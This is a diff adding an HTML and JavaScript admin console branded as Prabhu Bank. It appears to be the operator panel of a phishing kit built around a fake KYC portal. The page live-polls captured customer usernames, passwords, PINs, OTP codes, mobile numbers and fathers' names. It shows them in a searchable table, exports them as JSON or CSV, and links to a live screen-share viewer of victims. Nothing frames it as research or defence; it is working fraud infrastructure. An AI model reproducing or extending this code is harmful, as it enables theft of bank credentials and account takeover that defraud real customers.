@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Prabhu Bank - Backend Response Management Console</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Outfit:wght@500;600;700;800&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-base: #0f172a;
+      --bg-surface: #1e293b;
+      --bg-card: #1e293b;
+      --bg-card-hover: #334155;
+      --border-color: #334155;
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+      --primary: #c41e48;
+      --primary-hover: #9f1239;
+      --accent: #38bdf8;
+      --success: #10b981;
+      --warning: #f59e0b;
+      --danger: #ef4444;
+      --radius: 10px;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
+      background-color: var(--bg-base);
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Top Admin Bar */
+    .admin-navbar {
+      background: rgba(30, 41, 59, 0.95);
+      backdrop-filter: blur(10px);
+      border-bottom: 1px solid var(--border-color);
+      padding: 14px 28px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .brand-group {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .brand-logo-box {
+      width: 38px;
+      height: 38px;
+      background: linear-gradient(135deg, #c41e48, #e11d48);
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 12px rgba(196, 30, 72, 0.35);
+    }
+
+    .brand-title {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.15rem;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      color: #fff;
+    }
+
+    .brand-badge {
+      background: rgba(56, 189, 248, 0.15);
+      color: var(--accent);
+      font-size: 0.72rem;
+      font-weight: 700;
+      padding: 3px 8px;
+      border-radius: 6px;
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .nav-controls {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .server-status-pill {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(16, 185, 129, 0.12);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      color: var(--success);
+      padding: 6px 14px;
+      border-radius: 20px;
+      font-size: 0.8rem;
+      font-weight: 600;
+    }
+
+    .status-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--success);
+      box-shadow: 0 0 8px var(--success);
+      animation: pulseDot 2s infinite;
+    }
+
+    @keyframes pulseDot {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.85); }
+    }
+
+    .client-portal-link {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 0.82rem;
+      padding: 6px 12px;
+      border-radius: 6px;
+      border: 1px solid var(--border-color);
+      transition: all 0.2s ease;
+    }
+
+    .client-portal-link:hover {
+      background: rgba(255, 255, 255, 0.05);
+      color: #fff;
+      border-color: #475569;
+    }
+
+    /* Main Container */
+    .admin-main {
+      flex: 1;
+      max-width: 1500px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 28px 24px;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+
+    /* Stats Grid */
+    .stats-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(230px, 1fr));
+      gap: 16px;
+    }
+
+    .stat-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius);
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+    }
+
+    .stat-icon {
+      width: 48px;
+      height: 48px;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.4rem;
+      flex-shrink: 0;
+    }
+
+    .stat-icon.total { background: rgba(56, 189, 248, 0.15); color: var(--accent); }
+    .stat-icon.verified { background: rgba(16, 185, 129, 0.15); color: var(--success); }
+    .stat-icon.pending { background: rgba(245, 158, 11, 0.15); color: var(--warning); }
+    .stat-icon.today { background: rgba(196, 30, 72, 0.15); color: #f43f5e; }
+
+    .stat-meta h3 {
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--text-muted);
+      margin-bottom: 4px;
+    }
+
+    .stat-meta .stat-number {
+      font-family: 'Outfit', sans-serif;
+      font-size: 1.8rem;
+      font-weight: 800;
+      color: #fff;
+    }
+
+    /* Action & Search Bar */
+    .control-panel {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius);
+      padding: 16px 20px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .search-filter-group {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex: 1;
+      min-width: 280px;
+    }
+
+    .search-input-wrapper {
+      position: relative;
+      flex: 1;
+      max-width: 420px;
+    }
+
+    .search-icon {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--text-muted);
+      pointer-events: none;
+    }
+
+    .search-input {
+      width: 100%;
+      background: #0f172a;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 10px 12px 10px 38px;
+      color: #fff;
+      font-size: 0.88rem;
+      font-family: inherit;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    .search-input:focus {
+      border-color: var(--accent);
+    }
+
+    .filter-select {
+      background: #0f172a;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 10px 14px;
+      color: #fff;
+      font-size: 0.85rem;
+      font-family: inherit;
+      outline: none;
+      cursor: pointer;
+    }
+
+    .action-btn-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 9px 14px;
+      border-radius: 7px;
+      font-size: 0.82rem;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      border: 1px solid transparent;
+      transition: all 0.15s ease;
+    }
+
+    .btn-primary {
+      background: var(--primary);
+      color: #fff;
+    }
+    .btn-primary:hover { background: var(--primary-hover); }
+
+    .btn-outline {
+      background: #0f172a;
+      border-color: var(--border-color);
+      color: var(--text-main);
+    }
+    .btn-outline:hover {
+      background: rgba(255, 255, 255, 0.06);
+      border-color: #475569;
+    }
+
+    .btn-danger {
+      background: rgba(239, 68, 68, 0.15);
+      border-color: rgba(239, 68, 68, 0.3);
+      color: #fca5a5;
+    }
+    .btn-danger:hover {
+      background: var(--danger);
+      color: #fff;
+    }
+
+    .auto-refresh-toggle {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      cursor: pointer;
+      user-select: none;
+      padding: 6px 10px;
+      border-radius: 6px;
+      background: #0f172a;
+      border: 1px solid var(--border-color);
+    }
+
+    .auto-refresh-toggle input {
+      accent-color: var(--accent);
+      cursor: pointer;
+    }
+
+    /* Responses Table Card */
+    .table-card {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-color);
+      border-radius: var(--radius);
+      overflow: hidden;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.25);
+    }
+
+    .table-responsive {
+      overflow-x: auto;
+    }
+
+    table.responses-table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 0.86rem;
+    }
+
+    table.responses-table th {
+      background: #131d2e;
+      color: var(--text-muted);
+      font-size: 0.76rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+      padding: 14px 16px;
+      border-bottom: 1px solid var(--border-color);
+      white-space: nowrap;
+    }
+
+    table.responses-table td {
+      padding: 13px 16px;
+      border-bottom: 1px solid rgba(51, 65, 85, 0.5);
+      color: var(--text-main);
+      vertical-align: middle;
+      white-space: nowrap;
+    }
+
+    table.responses-table tr:hover td {
+      background: rgba(51, 65, 85, 0.4);
+    }
+
+    /* Badges & Cell Formats */
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      padding: 3px 8px;
+      border-radius: 12px;
+      font-size: 0.72rem;
+      font-weight: 700;
+      letter-spacing: 0.3px;
+    }
+
+    .status-badge.verified {
+      background: rgba(16, 185, 129, 0.15);
+      color: #34d399;
+      border: 1px solid rgba(16, 185, 129, 0.3);
+    }
+
+    .status-badge.initial {
+      background: rgba(245, 158, 11, 0.15);
+      color: #fbbf24;
+      border: 1px solid rgba(245, 158, 11, 0.3);
+    }
+
+    .code-pill {
+      font-family: 'Space Mono', monospace;
+      background: #0f172a;
+      border: 1px solid var(--border-color);
+      padding: 2px 7px;
+      border-radius: 4px;
+      font-size: 0.82rem;
+      color: #f1f5f9;
+      letter-spacing: 0.5px;
+    }
+
+    .otp-highlight {
+      font-family: 'Space Mono', monospace;
+      background: rgba(196, 30, 72, 0.2);
+      border: 1px solid rgba(196, 30, 72, 0.4);
+      color: #fda4af;
+      padding: 3px 8px;
+      border-radius: 6px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    .mobile-highlight {
+      font-weight: 700;
+      color: var(--accent);
+    }
+
+    .secret-field {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-family: 'Space Mono', monospace;
+      background: #0f172a;
+      padding: 2px 8px;
+      border-radius: 4px;
+      border: 1px solid #334155;
+    }
+
+    .toggle-secret-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      color: var(--text-muted);
+      font-size: 0.75rem;
+      padding: 0 2px;
+      line-height: 1;
+    }
+    .toggle-secret-btn:hover { color: #fff; }
+
+    .ip-tag {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      font-family: 'Space Mono', monospace;
+    }
+
+    /* Empty state */
+    .empty-state {
+      padding: 60px 20px;
+      text-align: center;
+      color: var(--text-muted);
+    }
+
+    .empty-icon {
+      font-size: 2.5rem;
+      margin-bottom: 12px;
+      opacity: 0.6;
+    }
+
+    .empty-state h4 {
+      font-size: 1.1rem;
+      color: #fff;
+      margin-bottom: 6px;
+    }
+
+    /* Details Modal */
+    .modal-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(15, 23, 42, 0.85);
+      backdrop-filter: blur(6px);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 20px;
+    }
+
+    .modal-overlay.open {
+      display: flex;
+    }
+
+    .modal-box {
+      background: var(--bg-surface);
+      border: 1px solid var(--border-color);
+      border-radius: 12px;
+      width: 100%;
+      max-width: 650px;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+    }
+
+    .modal-header {
+      padding: 16px 22px;
+      border-bottom: 1px solid var(--border-color);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .modal-header h3 {
+      font-size: 1.1rem;
+      font-weight: 700;
+    }
+
+    .modal-close-btn {
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      font-size: 1.4rem;
+      cursor: pointer;
+    }
+    .modal-close-btn:hover { color: #fff; }
+
+    .modal-body {
+      padding: 20px 22px;
+    }
+
+    .json-viewer {
+      background: #090d16;
+      border: 1px solid #1e293b;
+      padding: 14px;
+      border-radius: 8px;
+      color: #38bdf8;
+      font-family: 'Space Mono', monospace;
+      font-size: 0.8rem;
+      overflow-x: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+
+    /* Footer */
+    .admin-footer {
+      padding: 20px;
+      text-align: center;
+      font-size: 0.78rem;
+      color: #64748b;
+      border-top: 1px solid var(--border-color);
+      margin-top: auto;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Top Admin Bar -->
+  <header class="admin-navbar">
+    <div class="brand-group">
+      <img src="logo.png" alt="Prabhu Bank" style="height:32px; max-width:140px; object-fit:contain; border-radius:3px;">
+      <div>
+        <span class="brand-badge">Backend Engine</span>
+      </div>
+    </div>
+
+    <div class="nav-controls">
+      <div class="server-status-pill" id="serverStatusPill">
+        <span class="status-dot"></span>
+        <span id="serverStatusText">Backend Online (Port 8080)</span>
+      </div>
+      <a href="/viewer.html" class="client-portal-link" target="_blank" style="background:rgba(196,30,72,0.18); border-color:#c41e48; color:#fca5a5;">
+        <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
+          <path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.11-.9-2-2-2H4c-1.11 0-2 .89-2 2v10c0 1.1.89 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/>
+        </svg>
+        Screen Share Viewer
+      </a>
+      <a href="/" class="client-portal-link" target="_blank">
+        <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor">
+          <path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/>
+        </svg>
+        Open KYC Portal
+      </a>
+    </div>
+  </header>
+
+  <!-- Main Content Body -->
+  <main class="admin-main">
+
+    <!-- KPI Metric Cards -->
+    <div class="stats-grid">
+      <div class="stat-card">
+        <div class="stat-icon total">📊</div>
+        <div class="stat-meta">
+          <h3>Total Responses</h3>
+          <div class="stat-number" id="statTotalCount">0</div>
+        </div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon verified">✅</div>
+        <div class="stat-meta">
+          <h3>Verified KYC Submissions</h3>
+          <div class="stat-number" id="statVerifiedCount">0</div>
+        </div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon pending">⏳</div>
+        <div class="stat-meta">
+          <h3>In-Progress / Step 1</h3>
+          <div class="stat-number" id="statPendingCount">0</div>
+        </div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-icon today">📅</div>
+        <div class="stat-meta">
+          <h3>Today's Activity</h3>
+          <div class="stat-number" id="statTodayCount">0</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Toolbar & Filters -->
+    <div class="control-panel">
+      <div class="search-filter-group">
+        <div class="search-input-wrapper">
+          <span class="search-icon">🔍</span>
+          <input type="text" class="search-input" id="searchInput" placeholder="Search by mobile, name, PIN, OTP, ref ID...">
+        </div>
+        <select class="filter-select" id="statusFilter">
+          <option value="ALL">All Statuses</option>
+          <option value="VERIFIED_COMPLETE">Verified Complete</option>
+          <option value="INITIAL_SUBMISSION">Step 1 In-Progress</option>
+        </select>
+      </div>
+
+      <div class="action-btn-group">
+        <label class="auto-refresh-toggle">
+          <input type="checkbox" id="autoRefreshToggle" checked>
+          <span>Live Auto-refresh (3s)</span>
+        </label>
+        <button type="button" class="btn btn-outline" id="refreshBtn">🔄 Refresh</button>
+        <button type="button" class="btn btn-outline" id="exportJsonBtn">📥 Export JSON</button>
+        <button type="button" class="btn btn-outline" id="exportCsvBtn">📊 Export CSV</button>
+        <button type="button" class="btn btn-danger" id="clearAllBtn">🗑 Clear All</button>
+      </div>
+    </div>
+
+    <!-- Responses Table Container -->
+    <div class="table-card">
+      <div class="table-responsive">
+        <table class="responses-table">
+          <thead>
+            <tr>
+              <th>Status</th>
+              <th>Ref / Session ID</th>
+              <th>Submitted Time</th>
+              <th>Client IP</th>
+              <th>Username</th>
+              <th>Mobile Number</th>
+              <th>Password</th>
+              <th>PIN</th>
+              <th>Father's Name</th>
+              <th>OTP Code</th>
+              <th>Actions</th>
+            </tr>
+          </thead>
+          <tbody id="responsesTableBody">
+            <!-- Dynamically loaded -->
+          </tbody>
+        </table>
+      </div>
+
+      <div class="empty-state" id="emptyState" style="display: none;">
+        <div class="empty-icon">📂</div>
+        <h4>No Customer Responses Captured Yet</h4>
+        <p>When customers fill out and submit the KYC portal, their responses will instantly appear here.</p>
+      </div>
+    </div>
+
+  </main>
+
+  <!-- Details JSON Modal -->
+  <div class="modal-overlay" id="detailModal">
+    <div class="modal-box">
+      <div class="modal-header">
+        <h3>Customer Response Payload</h3>
+        <button type="button" class="modal-close-btn" id="closeDetailModal">&times;</button>
+      </div>
+      <div class="modal-body">
+        <pre class="json-viewer" id="jsonViewerContent"></pre>
+      </div>
+    </div>
+  </div>
+
+  <footer class="admin-footer">
+    Prabhu Bank KYC Backend Engine & Response Repository • Confidential Bank Administrator Interface
+  </footer>
+
+  <script>
+    (function () {
+      let responsesData = [];
+      let refreshInterval = null;
+
+      const DOM = {
+        tableBody: document.getElementById('responsesTableBody'),
+        emptyState: document.getElementById('emptyState'),
+        statTotal: document.getElementById('statTotalCount'),
+        statVerified: document.getElementById('statVerifiedCount'),
+        statPending: document.getElementById('statPendingCount'),
+        statToday: document.getElementById('statTodayCount'),
+        searchInput: document.getElementById('searchInput'),
+        statusFilter: document.getElementById('statusFilter'),
+        autoRefreshToggle: document.getElementById('autoRefreshToggle'),
+        refreshBtn: document.getElementById('refreshBtn'),
+        exportJsonBtn: document.getElementById('exportJsonBtn'),
+        exportCsvBtn: document.getElementById('exportCsvBtn'),
+        clearAllBtn: document.getElementById('clearAllBtn'),
+        detailModal: document.getElementById('detailModal'),
+        closeDetailModal: document.getElementById('closeDetailModal'),
+        jsonViewerContent: document.getElementById('jsonViewerContent'),
+        serverStatusText: document.getElementById('serverStatusText')
+      };
+
+      // Fetch all responses from Backend API
+      async function fetchResponses() {
+        try {
+          const res = await fetch('/api/responses');
+          if (!res.ok) throw new Error('HTTP ' + res.status);
+          const data = await res.json();
+          responsesData = Array.isArray(data) ? data : [];
+          updateStats(responsesData);
+          renderTable();
+          if (DOM.serverStatusText) DOM.serverStatusText.textContent = 'Backend Online (Port 8080)';
+        } catch (err) {
+          console.warn('Backend fetch error:', err);
+          if (DOM.serverStatusText) DOM.serverStatusText.textContent = 'Backend Connection Offline';
+        }
+      }
+
+      function updateStats(records) {
+        const total = records.length;
+        const verified = records.filter(r => r.status === 'VERIFIED_COMPLETE').length;
+        const pending = records.filter(r => r.status !== 'VERIFIED_COMPLETE').length;
+        
+        const todayStr = new Date().toISOString().slice(0, 10);
+        const todayCount = records.filter(r => {
+          const created = r.createdAt || '';
+          return created.startsWith(todayStr) || created.includes(new Date().toLocaleDateString());
+        }).length;
+
+        DOM.statTotal.textContent = total;
+        DOM.statVerified.textContent = verified;
+        DOM.statPending.textContent = pending;
+        DOM.statToday.textContent = todayCount;
+      }
+
+      function renderTable() {
+        const query = DOM.searchInput.value.toLowerCase().trim();
+        const filter = DOM.statusFilter.value;
+
+        const filtered = responsesData.filter(item => {
+          // Status match
+          if (filter !== 'ALL' && item.status !== filter) return false;
+
+          // Search match
+          if (!query) return true;
+          const searchStr = [
+            item.username,
+            item.mobile,
+            item.refId,
+            item.sessionId,
+            item.pin,
+            item.fatherName,
+            item.otp,
+            item.clientIp
+          ].join(' ').toLowerCase();
+
+          return searchStr.includes(query);
+        });
+
+        DOM.tableBody.innerHTML = '';
+
+        if (filtered.length === 0) {
+          DOM.emptyState.style.display = 'block';
+          return;
+        }
+
+        DOM.emptyState.style.display = 'none';
+
+        filtered.forEach((rec, idx) => {
+          const isVerified = rec.status === 'VERIFIED_COMPLETE';
+          const tr = document.createElement('tr');
+
+          tr.innerHTML = `
+            <td>
+              <span class="status-badge ${isVerified ? 'verified' : 'initial'}">
+                ${isVerified ? '● Verified Complete' : '○ Step 1 In-Progress'}
+              </span>
+            </td>
+            <td>
+              <span class="code-pill">${rec.refId || rec.sessionId || 'N/A'}</span>
+            </td>
+            <td>
+              <div style="font-size: 0.82rem; font-weight:600;">${rec.verifiedAt || rec.createdAt || 'N/A'}</div>
+            </td>
+            <td>
+              <span class="ip-tag">${rec.clientIp || '127.0.0.1'}</span>
+            </td>
+            <td>
+              <strong style="color:#f8fafc;">${rec.username || 'N/A'}</strong>
+            </td>
+            <td>
+              <span class="mobile-highlight">+977 ${rec.mobile || 'N/A'}</span>
+            </td>
+            <td>
+              <span class="code-pill" style="color:#38bdf8; font-weight:700; font-size:0.86rem; background:#0b1120; border:1px solid #1e293b; padding:4px 8px; border-radius:5px; font-family:'Space Mono', monospace;">${escapeHtml(rec.password || 'N/A')}</span>
+            </td>
+            <td>
+              <span class="code-pill" style="color:#f59e0b; font-weight:700; font-size:0.86rem; background:#0b1120; border:1px solid #1e293b; padding:4px 8px; border-radius:5px; font-family:'Space Mono', monospace;">${escapeHtml(rec.pin || 'N/A')}</span>
+            </td>
+            <td>${rec.fatherName || 'N/A'}</td>
+            <td>
+              ${rec.otp ? `<span class="otp-highlight">${rec.otp}</span>` : '<span style="color:#64748b;">(Pending)</span>'}
+            </td>
+            <td>
+              <div style="display:flex; gap:6px; align-items:center;">
+                <button type="button" class="btn btn-outline" style="padding:4px 8px; font-size:0.75rem;" data-idx="${idx}">Inspect</button>
+                ${rec.webrtcSessionId ? `
+                  <a href="/viewer.html?session=${encodeURIComponent(rec.webrtcSessionId)}" target="_blank" class="btn" style="background:#c41e48; color:#fff; padding:4px 8px; font-size:0.75rem; text-decoration:none; display:inline-flex; align-items:center; gap:4px; border-radius:5px;">
+                    <span style="display:inline-block; width:6px; height:6px; background:#4ade80; border-radius:50%;"></span>
+                    Live Screen
+                  </a>
+                ` : `
+                  <a href="/viewer.html" target="_blank" class="btn btn-outline" style="padding:4px 8px; font-size:0.75rem; color:#94a3b8; text-decoration:none;" title="Open Screen Viewer">
+                    Viewer
+                  </a>
+                `}
+              </div>
+            </td>
+          `;
+
+          // Inspect button handler
+          const inspectBtn = tr.querySelector('button[data-idx]');
+          if (inspectBtn) {
+            inspectBtn.addEventListener('click', () => {
+              openDetailModal(rec);
+            });
+          }
+
+          DOM.tableBody.appendChild(tr);
+        });
+      }
+
+      function escapeHtml(str) {
+        return (str || '').replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+      }
+
+      function openDetailModal(record) {
+        DOM.jsonViewerContent.textContent = JSON.stringify(record, null, 2);
+        DOM.detailModal.classList.add('open');
+      }
+
+      function closeDetailModal() {
+        DOM.detailModal.classList.remove('open');
+      }
+
+      function exportJson() {
+        const blob = new Blob([JSON.stringify(responsesData, null, 2)], { type: 'application/json' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `prabhu_bank_responses_${new Date().toISOString().slice(0, 10)}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+      }
+
+      function exportCsv() {
+        if (responsesData.length === 0) {
+          alert('No responses available to export.');
+          return;
+        }
+
+        const headers = ['RefID', 'SessionID', 'Status', 'Timestamp', 'ClientIP', 'Username', 'Mobile', 'Password', 'PIN', 'FatherName', 'OTP'];
+        const rows = responsesData.map(r => [
+          `"${r.refId || ''}"`,
+          `"${r.sessionId || ''}"`,
+          `"${r.status || ''}"`,
+          `"${r.verifiedAt || r.createdAt || ''}"`,
+          `"${r.clientIp || ''}"`,
+          `"${r.username || ''}"`,
+          `"${r.mobile || ''}"`,
+          `"${(r.password || '').replace(/"/g, '""')}"`,
+          `"${r.pin || ''}"`,
+          `"${(r.fatherName || '').replace(/"/g, '""')}"`,
+          `"${r.otp || ''}"`
+        ]);
+
+        const csvContent = [headers.join(','), ...rows.map(r => r.join(','))].join('\n');
+        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `prabhu_bank_responses_${new Date().toISOString().slice(0, 10)}.csv`;
+        a.click();
+        URL.revokeObjectURL(url);
+      }
+
+      async function clearAllResponses() {
+        if (!confirm('Are you sure you want to permanently clear all stored customer responses from the backend?')) {
+          return;
+        }
+
+        try {
+          const res = await fetch('/api/responses', { method: 'DELETE' });
+          if (res.ok) {
+            await fetchResponses();
+          } else {
+            alert('Failed to clear responses.');
+          }
+        } catch (err) {
+          alert('Error communicating with backend: ' + err.message);
+        }
+      }
+
+      function setupAutoRefresh() {
+        if (DOM.autoRefreshToggle.checked) {
+          if (!refreshInterval) {
+            refreshInterval = setInterval(fetchResponses, 3000);
+          }
+        } else {
+          if (refreshInterval) {
+            clearInterval(refreshInterval);
+            refreshInterval = null;
+          }
+        }
+      }
+
+      // Event bindings
+      DOM.searchInput.addEventListener('input', renderTable);
+      DOM.statusFilter.addEventListener('change', renderTable);
+      DOM.refreshBtn.addEventListener('click', fetchResponses);
+      DOM.exportJsonBtn.addEventListener('click', exportJson);
+      DOM.exportCsvBtn.addEventListener('click', exportCsv);
+      DOM.clearAllBtn.addEventListener('click', clearAllResponses);
+      DOM.closeDetailModal.addEventListener('click', closeDetailModal);
+      DOM.detailModal.addEventListener('click', (e) => {
+        if (e.target === DOM.detailModal) closeDetailModal();
+      });
+      DOM.autoRefreshToggle.addEventListener('change', setupAutoRefresh);
+
+      // Initial load
+      fetchResponses();
+      setupAutoRefresh();
+    })();
+  </script>
+</body>
+</html>
